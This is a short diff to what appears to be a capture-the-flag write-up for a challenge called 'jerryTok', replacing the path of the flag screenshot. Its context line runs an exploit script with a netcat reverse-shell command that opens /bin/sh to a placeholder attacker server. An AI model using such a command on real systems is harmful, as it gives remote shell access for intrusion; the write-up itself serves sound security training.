@@ -135,4 +135,4 @@ if __name__ == '__main__':
 python3 exploit-jerryTok.py --url http://<challenge_ip>:<challenge_port> --command "nc <your_server_ip> 1234 -e /bin/sh"
 ```
 
-![image](./image/flag.png)
+![image](Screenshot%202024-08-18%20114215.png)
